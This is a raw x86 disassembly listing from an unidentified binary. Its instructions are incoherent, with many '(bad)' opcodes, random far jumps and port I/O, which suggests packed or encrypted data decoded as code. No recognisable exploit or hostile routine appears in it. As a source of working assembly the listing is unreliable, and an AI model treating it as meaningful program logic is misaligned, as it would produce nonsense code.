  40d846:	add    BYTE PTR [edi-0x5e80b2f],bh
  40d84c:	dec    esi
  40d84d:	add    BYTE PTR [ebx+0x444af400],cl
  40d853:	hlt    
  40d854:	test   ah,al
  40d856:	inc    ebx
  40d857:	hlt    
  40d858:	lods   al,BYTE PTR ds:[esi]
  40d859:	(bad)  
  40d85a:	(bad)  
  40d85b:	(bad)  
  40d85c:	jmp    0x40d830
  40d85e:	mov    edx,0x84ff6414
  40d863:	shl    BYTE PTR [eax+0x4fc68b02],0x42
  40d86a:	clc    
  40d86b:	mov    DWORD PTR [ecx+0x14587b7],esi
  40d871:	dec    ebx
  40d872:	inc    esp
  40d873:	rol    BYTE PTR [ebp+eax*8+0x4675e043],1
  40d87a:	je     0x40d85d
	...
  40d898:	add    BYTE PTR [eax],al
  40d89a:	imul   edx,edx,0xffffffc2
  40d89d:	adc    DWORD PTR [esp+eax*1],esp
  40d8a0:	lea    eax,[ebp-0x7c]
  40d8a3:	psubsb mm4,QWORD PTR [ebx+edi*1+0x1]
  40d8a8:	add    BYTE PTR [ecx-0x7a74590f],cl
  40d8ae:	sub    BYTE PTR [ebp+edi*8+0x13bd04ff],bh
  40d8b5:	rol    BYTE PTR [ebp+0x3f],0x0
  40d8b9:	mov    esi,DWORD PTR [ecx+0x6bfffdda]
  40d8bf:	sub    al,al
  40d8c1:	les    edi,FWORD PTR [ebp+0x42]
  40d8c4:	in     eax,dx
  40d8c5:	push   0x5
  40d8c7:	dec    edx
  40d8c8:	inc    esp
  40d8c9:	loopne 0x40d8ff
  40d8cb:	dec    ecx
  40d8cc:	inc    esp
  40d8cd:	or     BYTE PTR [esi],bl
  40d8cf:	sub    edi,edi
  40d8d1:	xor    BYTE PTR [ecx+edx*2+0x8],bh
  40d8d5:	add    esp,esi
  40d8d7:	sbb    al,0xc9
  40d8d9:	ret    0xfef0
  40d8dc:	push   esp
  40d8dd:	mov    edi,DWORD PTR [eax]
  40d8df:	sub    dl,0x10
  40d8e2:	sub    DWORD PTR [eax],0x21
  40d8e5:	push   0xd
  40d8e7:	fnstenv [edi+edi*8]
  40d8ea:	and    BYTE PTR [ecx+0x560d3ff4],cl
  40d8f0:	(bad)  
  40d8f1:	or     esi,DWORD PTR [edi]
  40d8f3:	stc    
  40d8f4:	sub    esp,DWORD PTR [esi-0x6c]
  40d8f7:	call   0xc633:0x9508d01
	...
  40d91a:	add    BYTE PTR [eax],al
  40d91c:	or     ebx,eax
  40d91e:	(bad)  
  40d920:	sbb    eax,0x966602d9
  40d925:	fwait
  40d926:	shl    BYTE PTR [ebp-0x7c],cl
  40d929:	mov    ds:0x9b866605,al
  40d92e:	shl    BYTE PTR [ebp-0x6c],1
  40d931:	mov    ds:0xd4c88d03,al
  40d936:	xor    eax,ebp
  40d938:	jge    0x40d8ee
  40d93a:	add    al,BYTE PTR [eax]
  40d93c:	xchg   edx,eax
  40d93d:	loope  0x40d909
  40d93f:	dec    DWORD PTR [edx+0x63]
  40d942:	les    esi,FWORD PTR [ebx+0x1f]
  40d945:	pop    esi
  40d946:	cmp    esp,edi
  40d948:	imul   BYTE PTR [ecx-0x6]
  40d94b:	inc    esi
  40d94c:	inc    edx
  40d94d:	call   0xd01c62b3
  40d952:	fcmovb st,st(4)
  40d954:	inc    ecx
  40d955:	xlat   BYTE PTR ds:[ebx]
  40d956:	add    cl,BYTE PTR [ebp-0x17cc6330]
  40d95c:	inc    esi
  40d95d:	lds    eax,FWORD PTR [edx]
  40d95f:	add    BYTE PTR [eax-0x69edb069],dl
  40d965:	and    al,0xc8
  40d967:	cmp    cl,dl
  40d969:	stos   BYTE PTR es:[edi],al
  40d96a:	inc    ecx
  40d96b:	iret   
  40d96c:	pop    ebp
  40d96d:	stc    
  40d96e:	jl     0x40d9bd
  40d970:	push   ss
  40d971:	outs   dx,DWORD PTR ds:[esi]
  40d972:	mov    eax,ds:0x77d70cdb
  40d977:	inc    esp
  40d978:	(bad)  
  40d97a:	fist   DWORD PTR [edx]
  40d97c:	(bad)  
  40d97d:	(bad)  
  40d97e:	call   0x40d986
	...
  40d99b:	add    BYTE PTR [eax],al
  40d99d:	add    BYTE PTR [eax+0x5f4d4c0],dl
  40d9a3:	dec    ebx
  40d9a4:	push   ebp
  40d9a5:	xor    al,0xa
  40d9a7:	inc    edx
  40d9a8:	int3   
  40d9a9:	(bad)  
  40d9aa:	sub    BYTE PTR [edi-0x3a],dh
  40d9ad:	clc    
  40d9ae:	mov    dl,0x78
  40d9b0:	sbb    al,0x5
  40d9b2:	or     eax,0x4ac7ab7b
  40d9b7:	pop    eax
  40d9b8:	push   ecx
  40d9b9:	add    al,0xd
  40d9bb:	add    BYTE PTR [ecx],dl
  40d9bd:	push   eax
  40d9be:	sbb    eax,DWORD PTR [eax]
  40d9c0:	jmp    0x9d0161ef
  40d9c5:	hlt    
  40d9c6:	(bad)  
  40d9c7:	dec    ebx
  40d9c8:	or     eax,0x8f02ff14
  40d9cd:	xchg   al,bl
  40d9cf:	cld    
  40d9d0:	out    0x33,eax
  40d9d2:	jne    0x40da38
  40d9d4:	adc    eax,0x29b70d05
  40d9d9:	xor    DWORD PTR [esi-0x1d289824],eax
  40d9df:	std    
  40d9e0:	call   0x3e72b7e8
  40d9e5:	(bad)  
  40d9e6:	push   cs
  40d9e7:	(bad)  
  40d9e8:	call   0x6bbbb7f0
  40d9ed:	xchg   edi,eax
  40d9ee:	sub    ecx,ecx
  40d9f0:	mov    ebp,0xb5ffb733
  40d9f5:	lock xor ch,dh
  40d9f8:	sub    BYTE PTR [esi+eax*4],al
  40d9fb:	or     edi,DWORD PTR [ecx]
  40d9fd:	repnz dec edx
  40d9ff:	add    BYTE PTR [eax+0x40],dh
	...
  40da1e:	add    BYTE PTR [eax],al
  40da20:	add    eax,0x1e4fa883
  40da25:	jnp    0x40da82
  40da27:	xchg   edi,eax
  40da28:	icebp  
  40da29:	enter  0x3485,0x98
  40da2d:	push   edx
  40da2e:	xchg   ebp,eax
  40da2f:	(bad)  [ebx+edi*4-0x7bf11801]
  40da36:	mov    edi,0xc56d5f4
  40da3b:	je     0x40da8a
  40da3d:	mov    ah,0x69
  40da3f:	jmp    0x6b17a342
  40da44:	jp     0x40da3a
  40da46:	(bad)  
  40da47:	hlt    
  40da48:	push   cs
  40da49:	in     eax,dx
  40da4a:	aas    
  40da4b:	jmp    0x3e96b37b
  40da50:	popf   
  40da51:	test   al,0x11
  40da53:	test   eax,0xe802870e
  40da58:	push   cs
  40da59:	add    BYTE PTR [ebx],bh
  40da5b:	sub    BYTE PTR [ebx+edi*2],bh
  40da5e:	je     0x40da6d
  40da60:	xchg   DWORD PTR [ebx],edi
  40da62:	rol    DWORD PTR [ecx],0xdf
  40da65:	mov    ebx,0x88f2e900
  40da6a:	je     0x40da61
  40da6c:	enter  0x8afb,0x27
  40da70:	sar    bh,0x4f
  40da73:	neg    BYTE PTR [ebp+edi*2+0x43d5ddc3]
  40da7a:	clc    
  40da7b:	cmp    edx,eax
  40da7d:	sub    DWORD PTR [ebx+0x4fc954dc],0x43
	...
  40daa0:	add    BYTE PTR [eax],al
  40daa2:	adc    esi,DWORD PTR [edi+0x5c]
  40daa5:	rol    DWORD PTR [ebx+esi*8-0x31],1
  40daa9:	fcmove st,st(6)
  40daab:	inc    DWORD PTR [ebx-0x730e4257]
  40dab1:	ins    BYTE PTR es:[edi],dx
  40dab2:	jne    0x40da7f
  40dab4:	(bad)  
  40dab5:	scas   al,BYTE PTR es:[edi]
  40dab6:	fnstenv [esp+eax*2-0x5f]
  40daba:	or     BYTE PTR [eax+eiz*8-0x6f],0x10
  40dabf:	mov    ah,0x0
  40dac1:	jmp    0xdcb56240
  40dac6:	push   eax
  40dac7:	hlt    
  40dac8:	mov    WORD PTR [eax],es
  40daca:	cmp    esp,ebx
  40dacc:	push   0xd5b90400
  40dad1:	sub    DWORD PTR [eax+0x70458bc8],0xc
  40dad8:	lea    eax,[ebp-0x8]
  40dadb:	or     ecx,DWORD PTR [ebp-0x72f35fbb]
  40dae1:	inc    ebp
  40dae2:	cwde   
  40dae3:	or     al,0x6a
  40dae5:	inc    DWORD PTR [ebx-0x29]
  40dae8:	jmp    0x59c0:0x85037412
  40daef:	(bad)  
  40daf0:	xor    esi,esi
  40daf2:	dec    edi
  40daf3:	and    ecx,DWORD PTR [ebx+0x4c451845]
  40daf9:	mov    eax,0x5039e
  40dafe:	hlt    
  40daff:	ret    0x6828
  40db02:	in     al,0x51
  40db04:	xchg   edi,eax
	...
  40db21:	add    BYTE PTR [eax],al
  40db23:	add    ch,ah
  40db25:	xchg   edx,eax
  40db26:	pop    ds
  40db27:	dec    esi
  40db28:	xchg   esi,eax
  40db29:	mov    ecx,0x38fc504f
  40db2e:	into   
  40db2f:	add    ah,BYTE PTR [esp+eax*2-0x11]
  40db33:	mov    esi,DWORD PTR [ecx-0x55]
  40db36:	add    DWORD PTR [ebp+0x68],ecx
  40db39:	inc    esp
  40db3a:	inc    esp
  40db3b:	fdiv   QWORD PTR [ecx-0x52edfee2]
  40db41:	sbb    eax,0x367f85f8
  40db46:	pop    es
  40db47:	xor    edx,DWORD PTR [ebx-0x56]
  40db4a:	test   DWORD PTR [eax],eax
  40db4c:	xor    al,0x3
  40db4e:	mov    eax,ebx
  40db50:	dec    esp
  40db51:	enter  0x1d9,0x24
  40db55:	inc    esp
  40db56:	test   DWORD PTR [ebp-0x3985c94d],0x94a101eb
  40db60:	or     eax,0x8400437b
  40db65:	sbb    eax,0x7a7da003
  40db6a:	inc    ebx
  40db6b:	add    BYTE PTR [eax+0x5287f5e5],dl
  40db71:	aam    0xc7
  40db73:	adc    al,0xb5
  40db75:	stos   BYTE PTR es:[edi],al
  40db76:	inc    edx
  40db77:	add    BYTE PTR [ebx],dh
  40db79:	push   eax
  40db7a:	inc    eax
  40db7b:	push   es
  40db7c:	xchg   esp,eax
  40db7d:	lods   eax,DWORD PTR ds:[esi]
  40db7e:	cli    
  40db7f:	xchg   BYTE PTR gs:[ebx+0x64f88aa6],dl
  40db86:	lock aas 
	...
  40dba4:	add    BYTE PTR [eax],al
  40dba6:	or     eax,0x114679b7
  40dbab:	mov    edi,0xb6a1447b
  40dbb0:	jns    0x40dbf8
  40dbb2:	add    edi,DWORD PTR [edi+0x7675447b]
  40dbb8:	jns    0x40dc00
  40dbba:	sbb    eax,0x9468fd6
  40dbbf:	mov    edi,eax
  40dbc1:	je     0x40dc1c
  40dbc3:	mov    edi,eax
  40dbc5:	aad    0x1a
  40dbc7:	push   es
  40dbc8:	inc    eax
  40dbc9:	or     al,0xe
  40dbcb:	and    eax,edi
  40dbcd:	mov    dh,0xd2
  40dbcf:	fiadd  WORD PTR [ebx-0x3896fe3d]
  40dbd5:	je     0x40dc10
  40dbd7:	or     edi,eax
  40dbd9:	aad    0x12
  40dbdb:	outs   dx,BYTE PTR ds:[esi]
  40dbdc:	adc    BYTE PTR ds:[esi+0x24ff794],cl
  40dbe3:	outs   dx,BYTE PTR ds:[esi]
  40dbe4:	ds push cs
  40dbe6:	sub    al,BYTE PTR [ebx]
  40dbe8:	in     al,0x2
  40dbea:	dec    esi
  40dbeb:	call   0xebc7b1b6
  40dbf0:	retf   
  40dbf1:	or     BYTE PTR [ecx-0x5c],0x77
  40dbf5:	je     0x40dbd8
  40dbf7:	add    BYTE PTR [ecx-0x170029e9],dl
  40dbfd:	js     0x40db80
  40dbff:	aam    0x80
  40dc01:	pop    ds
  40dc02:	(bad)  
  40dc03:	(bad)  
  40dc04:	call   0x91213d81
  40dc09:	out    0x0,eax
	...
  40dc27:	add    bh,dl
  40dc29:	(bad)  
  40dc2a:	call   0x60392da9
  40dc2f:	in     al,dx
  40dc30:	xchg   DWORD PTR [ebp-0x4899d9f3],edi
  40dc36:	sub    al,BYTE PTR [eax]
  40dc38:	or     eax,0xd32eb431
  40dc3d:	(bad)  
  40dc3e:	out    0xdb,eax
  40dc40:	int    0xe8
  40dc42:	jmp    0xe2f1:0xe1139603
  40dc49:	(bad)  
  40dc4a:	stc    
  40dc4b:	stos   BYTE PTR es:[edi],al
  40dc4c:	xchg   edx,eax
  40dc4d:	ds call 0xa9e6e6d9
  40dc53:	add    eax,DWORD PTR [ebp-0x1d]
  40dc56:	and    BYTE PTR [ecx+0x1b93ffcf],ch
  40dc5c:	loop   0x40dc22
  40dc5e:	cmp    ecx,DWORD PTR [eax+edx*1]
  40dc61:	enter  0x432b,0xd
  40dc65:	dec    ebx
  40dc66:	(bad)  
  40dc68:	sbb    al,0xed
  40dc6a:	jmp    0x85f8:0x7cc09103
  40dc71:	jecxz  0x40dc5f
  40dc73:	test   al,0xcf
  40dc75:	jmp    FWORD PTR [esi+0x29a34500]
  40dc7b:	add    al,0xc
  40dc7d:	sub    eax,0xf216f0d6
  40dc82:	sub    BYTE PTR [ebx+esi*4],al
  40dc85:	sahf   
  40dc86:	mov    edx,0x46ffcfa9
  40dc8b:	jge    0x40dc8d
	...
  40dca9:	add    al,dl
  40dcab:	add    DWORD PTR [eax],eax
  40dcad:	rol    DWORD PTR [eax-0x7916fe13],0x3b
  40dcb4:	add    al,0xe1
  40dcb6:	cmc    
  40dcb7:	int3   
  40dcb8:	fsubr  QWORD PTR [edx]
  40dcba:	adc    DWORD PTR [ebx+0x28],ecx
  40dcbd:	ds retf 0x37ab
  40dcc1:	in     al,dx
  40dcc2:	(bad)  
  40dcc3:	mov    ds:0xee3de942,eax
  40dcc8:	out    0x79,eax
  40dcca:	call   0xceaddccd
  40dccf:	push   eax
  40dcd0:	or     eax,0xdcc8b560
  40dcd5:	stos   BYTE PTR es:[edi],al
  40dcd6:	push   cs
  40dcd7:	mov    esi,0x41656104
  40dcdc:	add    al,ch
  40dcde:	jecxz  0x40dca4
  40dce0:	adc    al,0xed
  40dce2:	pushf  
  40dce3:	add    al,0x0
  40dce5:	iret   
  40dce6:	imul   ecx,edx,0x5e0eaad9
  40dcec:	mov    DWORD PTR [edi-0x2e4827f3],ebp
  40dcf2:	or     al,0x0
  40dcf4:	mov    DWORD PTR [edi+0x1514c583],ebp
  40dcfa:	jl     0x40dd00
  40dcfc:	add    BYTE PTR [esi-0x5876a1db],dh
  40dd02:	addr16 sub ebx,eax
  40dd05:	pushf  
  40dd06:	out    0xd8,eax
  40dd08:	add    BYTE PTR ds:0x5deb7f46,0x0
	...
  40dd2b:	add    BYTE PTR [eax+eax*1],cl
  40dd2e:	add    BYTE PTR [edx-0x300d308],bl
  40dd34:	pop    esi
  40dd35:	out    dx,al
  40dd36:	aas    
  40dd37:	jmp    0x2dc98659
  40dd3c:	in     eax,dx
  40dd3d:	or     edi,DWORD PTR [ebx]
  40dd3f:	stos   BYTE PTR es:[edi],al
  40dd40:	(bad)  
  40dd42:	xor    al,BYTE PTR [eax]
  40dd44:	je     0x40dcee
  40dd46:	cmp    DWORD PTR [edx],eax
  40dd48:	and    al,0x0
  40dd4a:	push   0x25da
  40dd4f:	push   0xffffffec
  40dd51:	mov    esp,0x41c2d833
  40dd56:	add    bh,al
  40dd58:	xor    BYTE PTR [eax],ah
  40dd5a:	and    BYTE PTR [edx],al
  40dd5c:	in     al,0xff
  40dd5e:	(bad)  
  40dd5f:	(bad)  
  40dd60:	loope  0x40dd45
  40dd62:	adc    BYTE PTR [eax-0xc],al
  40dd65:	dec    eax
  40dd66:	idiv   DWORD PTR [ebx]
  40dd68:	(bad)  
  40dd69:	xor    al,bl
  40dd6b:	lea    esp,[eax+0x20]
  40dd6e:	nop
  40dd6f:	add    BYTE PTR [edi+edi*8+0x2787534f],dh
  40dd76:	and    al,0x60
  40dd78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dd79:	call   DWORD PTR [edx-0x3a]
  40dd7c:	mov    ds:0x105c88fe,eax
  40dd81:	call   0xd0acf384
  40dd86:	add    BYTE PTR ds:[ecx],dh
  40dd89:	mov    esp,0x80291273
  40dd8e:	and    dl,BYTE PTR [eax+0x0]
	...
  40ddac:	add    BYTE PTR [eax],al
  40ddae:	je     0x40ddaf
  40ddb0:	dec    DWORD PTR [edi+0x2b]
  40ddb3:	rol    esi,cl
  40ddb5:	adc    esp,DWORD PTR [edi+edi*8-0x28bfbb78]
  40ddbc:	data16 rol BYTE PTR [edi-0x4f72ffc1],1
  40ddc3:	jecxz  0x40dde6
  40ddc5:	push   eax
  40ddc6:	pop    ebx
  40ddc7:	ror    dh,cl
  40ddc9:	adc    ah,BYTE PTR [edi+edi*8+0x750748c]
  40ddd0:	mov    eax,0xffff349c
  40ddd5:	out    0x91,eax
  40ddd7:	sbb    al,0x1
  40ddd9:	add    BYTE PTR ds:0xd1c5bd5e,cl
  40dddf:	cld    
  40dde0:	pop    ds
  40dde1:	add    DWORD PTR [edx+0x15],ecx
  40dde4:	and    BYTE PTR [eax],ch
  40dde6:	out    dx,al
  40dde7:	fadd   DWORD PTR [edx]
  40dde9:	add    BYTE PTR [ebp+edx*1-0xb6bd3e0],al
  40ddf0:	pop    ds
  40ddf1:	xor    BYTE PTR [ebp-0x7bf0dfc4],dl
  40ddf7:	add    al,0x20
  40ddf9:	adc    BYTE PTR [esi+0x1e10201c],al
  40ddff:	cdq    
  40de00:	inc    edx
  40de01:	shr    ebp,cl
  40de03:	push   ebx
  40de04:	aas    
  40de05:	and    al,0x21
  40de07:	sar    BYTE PTR [esi+0x68],cl
  40de0a:	or     al,0xd9
  40de0c:	add    cl,BYTE PTR [ebx-0x21142af]
	...
  40de2e:	add    BYTE PTR [eax],al
  40de30:	dec    edx
  40de31:	fdivr  DWORD PTR [edi+0x43]
  40de34:	icebp  
  40de35:	int3   
  40de36:	lock mov ecx,?
  40de39:	sar    DWORD PTR [eax+0x43],1
  40de3c:	icebp  
  40de3d:	mov    eax,ds:0x4312057a
  40de42:	ret    
  40de43:	mov    ds,WORD PTR gs:[eax]
  40de46:	inc    edx
  40de47:	data16 test BYTE PTR [esi+ebx*1+0x1e9c981c],dl
  40de4f:	sbb    al,0xdd
  40de51:	adc    bh,BYTE PTR [edi]
  40de53:	and    al,0x1c
  40de55:	fld    st(3)
  40de57:	adc    al,0x75
  40de59:	mov    BYTE PTR [edx+0x0],0xd5
  40de5d:	mov    al,ds:0xd84f83f3
  40de62:	add    al,BYTE PTR [eax]
  40de64:	(bad)
  40de67:	mov    al,0xd
  40de69:	fld    DWORD PTR [edx]
  40de6b:	dec    eax
  40de6c:	sbb    bl,BYTE PTR [ebp-0x60]
  40de6f:	inc    DWORD PTR [edx-0x1]
  40de72:	call   0x73bce8c2
  40de77:	add    al,0xd
  40de79:	add    BYTE PTR [ecx],ah
  40de7b:	adc    edx,DWORD PTR [eax+0xd03e896]
  40de81:	mov    edx,0xfd09e82c
  40de86:	js     0x40de8d
  40de88:	dec    ebx
  40de89:	cmp    ecx,DWORD PTR ds:0xa87c0d12
  40de8f:	adc    ecx,DWORD PTR [ecx+0x3e8da]
	...
  40deb1:	add    BYTE PTR ds:0xd04e458,cl
  40deb7:	add    BYTE PTR [eax+ecx*4+0x2e],ah
  40debb:	ins    BYTE PTR es:[edi],dx
  40debc:	call   0x1a70ebc4
  40dec1:	push   edi
  40dec2:	ds sub eax,0x1c4e911a
  40dec8:	mov    cl,0x53
  40deca:	retf   0x9ceb
  40decd:	push   ss
  40dece:	dec    ebp
  40decf:	add    BYTE PTR [esp+eax*8+0xb],ch
  40ded3:	jl     0x40df46
  40ded5:	add    al,0xd
  40ded7:	add    BYTE PTR [edx],bl
  40ded9:	les    esi,FWORD PTR [eax]
  40dedb:	ja     0x40df41
  40dedd:	call   0x429dd5c
  40dee2:	mov    BYTE PTR [esp+eax*1-0x6c],bh
  40dee6:	xchg   edx,eax
  40dee7:	shr    eax,0x53
  40deea:	mov    ch,bl
  40deec:	sub    BYTE PTR [eax],bl
  40deee:	int    0xff
  40def0:	outs   dx,DWORD PTR ds:[esi]
  40def1:	pusha  
  40def2:	xor    DWORD PTR [eax],edx
  40def4:	fcmovnu st,st(6)
  40def6:	cmp    DWORD PTR [ecx*8-0x1a1d8d19],0x287b0d03
  40df01:	cmp    BYTE PTR [ebx+0x2e886c2f],bh
  40df07:	ins    BYTE PTR es:[edi],dx
  40df08:	(bad)  
  40df09:	call   0xee90df1c
  40df0e:	and    eax,0x112911dc
  40df13:	jnp    0x40ded4
  40df15:	push   esp
	...
  40df32:	add    BYTE PTR [eax],al
  40df34:	(bad)  
  40df35:	jnp    0x40df11
  40df37:	pop    ebp
  40df38:	jo     0xe1bc838
  40df3e:	lea    ebp,[edx]
  40df40:	dec    edi
  40df41:	add    eax,0xbb163603
  40df46:	inc    ebx
  40df47:	or     eax,0xf9eaf01f
  40df4c:	aam    0x3c
  40df4e:	and    al,0xf4
  40df50:	adc    dl,ch
  40df52:	adc    eax,0xd1c4aa7
  40df57:	jmp    0xf3f5:0x25c5f1bb
  40df5e:	add    DWORD PTR [eax+0x7efec16f],edx
  40df64:	les    edi,FWORD PTR [esp]
  40df67:	in     al,0x11
  40df69:	push   cs
  40df6a:	rol    BYTE PTR [eax+0x66fec165],0xc4
  40df71:	cmp    al,0x24
  40df73:	out    dx,eax
  40df74:	mov    esi,0x522f04d5
  40df79:	sbb    al,0xe
  40df7b:	or     edi,ecx
  40df7d:	mov    ebp,0xa5a35cea
  40df82:	mov    WORD PTR [ebp+0x645000aa],fs
  40df88:	rcr    BYTE PTR [ebx],cl
  40df8a:	cmp    al,0x99
  40df8c:	(bad)  [edx+0x43]
  40df8f:	int    0x66
  40df91:	xor    bh,bh
  40df93:	hlt    
  40df94:	pop    edx
  40df95:	out    dx,al
  40df96:	aas    
  40df97:	jmp    0x40df9c
	...
  40dfb4:	add    BYTE PTR [eax],al
  40dfb6:	xchg   ebp,eax
  40dfb7:	xor    BYTE PTR [ebx-0x13],0x93
  40dfbb:	cmp    al,0x24
  40dfbd:	add    BYTE PTR [ebx+esi*2+0x44],cl
  40dfc1:	add    bl,bh
  40dfc3:	cmp    BYTE PTR [esp+edi*1],ah
  40dfc6:	lods   eax,DWORD PTR ds:[esi]
  40dfc7:	ss push es
  40dfc9:	mov    ebp,DWORD PTR [eax-0x28]
  40dfcc:	ds mov edx,ebp
  40dfcf:	icebp  
  40dfd0:	mov    al,BYTE PTR [eax+ecx*1+0x38]
  40dfd4:	mov    DWORD PTR [esi+0x32],eax
  40dfd7:	jb     0x40e01b
  40dfd9:	and    al,0x42
  40dfdb:	repnz inc ebx
  40dfdd:	and    al,0x21
  40dfdf:	jae    0x40e02b
  40dfe1:	and    al,0x34
  40dfe3:	je     0x40e029
  40dfe5:	add    ebp,edi
  40dfe7:	dec    edi
  40dfe8:	and    al,0x18
  40dfea:	cmp    DWORD PTR [edi],eax
  40dfec:	or     al,0x80
  40dfee:	jl     0x40e03a
  40dff0:	add    esi,edi
  40dff2:	sub    BYTE PTR [eax-0x57c700f3],ch
  40dff8:	push   cs
  40dff9:	adc    BYTE PTR [eax],0xa8
  40dffc:	or     eax,0x6f85e31a
  40e001:	(bad)  
  40e002:	push   ebx
  40e003:	sar    DWORD PTR [esi+0x7c],0xd8
  40e007:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e008:	dec    BYTE PTR [edx+0x4c8b0be9]
  40e00e:	or     BYTE PTR [eax],bl
  40e010:	mov    DWORD PTR [eax],ecx
  40e012:	(bad)  [edx]
  40e014:	push   DWORD PTR [eax+ebx*1-0x50]
  40e018:	out    0x90,al
	...
  40e036:	add    BYTE PTR [eax],al
  40e038:	fild   DWORD PTR [edx]
  40e03a:	add    BYTE PTR [ebx+0x5b5e20eb],cl
  40e040:	pop    ds
  40e041:	addr16 pop ebx
  40e043:	ret    0x378
  40e046:	push   ebp
  40e047:	mov    eax,DWORD PTR [eax-0x7b]
  40e04a:	loop   0x40e044
  40e04c:	out    0x6f,eax
  40e04e:	cmp    dl,BYTE PTR [ebx-0x46]
  40e051:	pop    eax
  40e052:	push   0x8
  40e054:	or     eax,0x965ddbda
  40e059:	test   DWORD PTR [esi-0x765acebd],0x89dd295b
  40e063:	pop    ebx
  40e064:	icebp  
  40e065:	enter  0x5b89,0xe9
  40e069:	(bad)  
  40e06a:	mov    DWORD PTR [ebx-0xf],0xd004410
  40e071:	test   eax,0xa8a9d4aa
  40e076:	add    cl,BYTE PTR [ebx-0x7bdffb2f]
  40e07c:	dec    ebp
  40e07d:	std    
  40e07e:	adc    DWORD PTR [ebx+0x2e404c9],ecx
  40e084:	int3   
  40e085:	pop    ds
  40e086:	aaa    
  40e087:	and    al,0x2d
  40e089:	mov    dl,0xc3
  40e08b:	je     0x40e095
  40e08d:	clc    
  40e08e:	stos   DWORD PTR es:[edi],eax
  40e08f:	cmp    dl,bl
  40e091:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e092:	add    dh,BYTE PTR [ebx]
  40e094:	int    0x7f
  40e096:	adc    eax,0xf3a90d02
  40e09b:	mov    edi,0x0
	...
  40e0b8:	add    BYTE PTR [eax],al
  40e0ba:	mov    BYTE PTR [eax+ebp*8],al
  40e0bd:	adc    al,0xa6
  40e0bf:	push   es
  40e0c0:	ins    DWORD PTR es:[edi],dx
  40e0c1:	test   eax,0x13e7ecd3
  40e0c6:	or     al,0x81
  40e0c8:	leave  
  40e0c9:	xchg   BYTE PTR [ecx+ebp*4],cl
  40e0cc:	mov    ebp,edi
  40e0ce:	test   ah,dl
  40e0d0:	out    0xf,al
  40e0d2:	out    0x59,al
  40e0d4:	adc    BYTE PTR [edx+eax*1-0x79fffd58],al
  40e0db:	mov    ds:0xa94d164e,eax
  40e0e0:	mov    eax,DWORD PTR [ebp-0x33]
  40e0e3:	sub    DWORD PTR [ebx-0x47daede9],edi
  40e0e9:	(bad)  
  40e0ea:	jp     0x40e0eb
  40e0ec:	call   0xe94070ef
  40e0f1:	add    ebx,DWORD PTR [edx]
  40e0f3:	test   BYTE PTR [ebx+eax*1],al
  40e0f6:	or     eax,0xd1416a00
  40e0fb:	add    dh,dh
  40e0fd:	xchg   BYTE PTR [edi+edi*8-0x18],ch
  40e101:	add    esi,DWORD PTR ds:0xd05dc13
  40e107:	cld    
  40e108:	in     al,0x35
  40e10a:	add    al,0xb7
  40e10c:	cs cld 
  40e10e:	mov    dl,0x0
  40e110:	jmp    0x6a4a1718
  40e115:	or     DWORD PTR ds:[eax],eax
  40e118:	push   esp
  40e119:	or     cl,BYTE PTR [esi+0x4313d]
	...
  40e13b:	add    BYTE PTR [edx],al
  40e13d:	test   BYTE PTR [eax-0x5fff2fc],ch
  40e143:	ret    
  40e144:	je     0x40e14c
  40e146:	inc    edi
  40e147:	lea    ecx,[esi-0x1c]
  40e14a:	fcomp  DWORD PTR [eax+eax*4+0x3c]
  40e14e:	vpandn ymm5,ymm2,YMMWORD PTR [ecx+0x42]
  40e153:	mov    esp,DWORD PTR [eax+0x10]
  40e156:	adc    BYTE PTR [edi-0x7a],0x45
  40e15a:	cmc    
  40e15b:	mov    BYTE PTR [edx+0x5b8b2c34],dl
  40e161:	adc    BYTE PTR [edx-0x43],ch
  40e164:	adc    dh,BYTE PTR [ebx]
  40e166:	iret   
  40e167:	and    eax,0x38eaf88e
  40e16c:	adc    eax,0xdde7ac8a
  40e171:	mov    ebp,0x83dde7ac
  40e176:	pop    ds
  40e177:	cmp    esi,ebx
  40e179:	sub    BYTE PTR [eax],0x8
  40e17c:	daa    
  40e17d:	add    al,0x99
  40e17f:	nop
  40e180:	into   
  40e181:	jecxz  0x40e182
  40e183:	icebp  
  40e184:	mov    bh,0xe0
  40e186:	xor    BYTE PTR [eax],0x2d
  40e189:	xor    esp,DWORD PTR [edx]
  40e18b:	(bad)  
  40e18c:	(bad)  
  40e18d:	cmc    
  40e18e:	push   ss
  40e18f:	xchg   esp,eax
  40e190:	or     cl,BYTE PTR [edx-0x44a332b5]
  40e196:	inc    ebx
  40e197:	lds    ebx,FWORD PTR [ecx+eax*4-0x38]
  40e19b:	jl     0x40e19b
  40e19d:	cmp    BYTE PTR [edi+0xf1],0x0
	...
  40e1bc:	add    BYTE PTR [eax],al
  40e1be:	hlt    
  40e1bf:	(bad)  
  40e1c1:	fs aad 0xe3
  40e1c4:	ds cdq 
  40e1c6:	jnp    0x40e19a
  40e1c8:	sub    BYTE PTR [ebp-0xe8176fe],0x95
  40e1cf:	mov    esi,0x88e88c74
  40e1d4:	inc    ebp
  40e1d5:	adc    ebx,esi
  40e1d7:	xchg   BYTE PTR [ebx+0xd],al
  40e1da:	sbb    eax,0x8829458a
  40e1df:	mov    esi,0xf90ee8ff
  40e1e4:	(bad)  
  40e1e5:	ror    ecx,cl
  40e1e7:	mov    dl,0xd0
  40e1e9:	retf   
  40e1ea:	(bad)  
  40e1eb:	mov    DWORD PTR [ebp-0x23],eax
  40e1ee:	xchg   esi,eax
  40e1ef:	dec    eax
  40e1f0:	and    al,0xc7
  40e1f2:	popa   
  40e1f3:	mov    esi,0x260ee9fe
  40e1f8:	mov    DWORD PTR ds:0xa83aede5,esi
  40e1fe:	add    eax,DWORD PTR [ebx]
  40e200:	pushaw 
  40e202:	dec    edx
  40e203:	in     al,0x2e
  40e205:	add    edx,DWORD PTR [esi]
  40e207:	mov    eax,DWORD PTR [ebx+0xd]
  40e20a:	mov    ecx,0xb2d5ff4c
  40e20f:	in     al,0x8c
  40e211:	aad    0xaa
  40e213:	in     al,0xe7
  40e215:	lahf   
  40e216:	xlat   BYTE PTR ds:[ebx]
  40e217:	(bad)  
  40e218:	(bad)  
  40e219:	jmp    DWORD PTR [ecx]
  40e21b:	shl    DWORD PTR [edx+0x4],0x4a
  40e21f:	inc    ebp
  40e220:	and    al,0x19
	...
  40e23e:	add    BYTE PTR [eax],al
  40e240:	out    dx,eax
  40e241:	repnz pop es
